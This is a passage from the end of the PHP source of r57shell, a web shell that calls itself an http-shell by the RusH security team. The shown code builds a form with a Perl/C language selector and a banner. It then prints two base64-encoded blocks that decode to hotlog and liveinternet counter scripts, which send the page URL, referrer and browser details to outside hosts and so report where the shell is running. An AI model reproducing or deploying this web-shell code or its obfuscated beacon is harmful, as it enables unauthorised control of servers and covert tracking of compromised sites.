echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt4]." \">";
echo "</font>";
echo "</form>";
echo $table_end1;

/* (c) */
echo $table_up3;
echo "<div align=center><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RusH security team | <a href=http://rst.void.ru>http://rst.void.ru</a> | version 1.1 ]---o</b></font></div>";
echo $table_end1;

print base64_decode("PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+aG90bG9nX2pzPSIxLjAiO2hvdGxvZ19yPSIiK0
1hdGgucmFuZG9tKCkrIiZzPTgxNjA2JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3a
W5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2llPSJob3Rsb2c9MTsgcGF0aD0vIjsgaG90bG9nX3IrPSImYz0iKyhk
b2N1bWVudC5jb29raWU/IlkiOiJOIik7PC9zY3JpcHQ+PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdDEuMSI+aG90bG9nX2p
zPSIxLjEiO2hvdGxvZ19yKz0iJmo9IisobmF2aWdhdG9yLmphdmFFbmFibGVkKCk/IlkiOiJOIik8L3NjcmlwdD48c2NyaXB0IG
xhbmd1YWdlPSJqYXZhc2NyaXB0MS4yIj5ob3Rsb2dfanM9IjEuMiI7aG90bG9nX3IrPSImd2g9IitzY3JlZW4ud2lkdGgrJ3gnK
3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5j
b2xvckRlcHRoOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQxLjMiPmhvdGx
vZ19qcz0iMS4zIjwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPmhvdGxvZ19yKz0iJmpzPSIraG90bG9nX2
pzO2RvY3VtZW50LndyaXRlKCI8YSBocmVmPSdodHRwOi8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48a
W1nICIrIiBzcmM9J2h0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hvdGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3Jk
ZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSBocmVmPWh0dHA6Ly9jbGljay5
ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWdzcmM9Imh0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hvdGxvZy
9jb3VudD9zPTgxNjA2JmltPTEiIGJvcmRlcj0wd2lkdGg9IjEiIGhlaWdodD0iMSIgYWx0PSJIb3RMb2ciPjwvYT48L25vc2Nya
XB0Pg==");

print base64_decode("PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PC
EtLQ0KZG9jdW1lbnQud3JpdGUoJzxhIGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3Rhcmdld
D1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnlhZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5y
ZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJztzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5
oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5waXhlbERlcHRoKSkrJzsnK0
1hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4Ofg7e4g9+jx6+4g7/Du8ezu8vDu4iDoIO/u8eXy6
PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0v
TGl2ZUludGVybmV0LS0+");

/* -------------------------[ EOF ]------------------------- */

?>
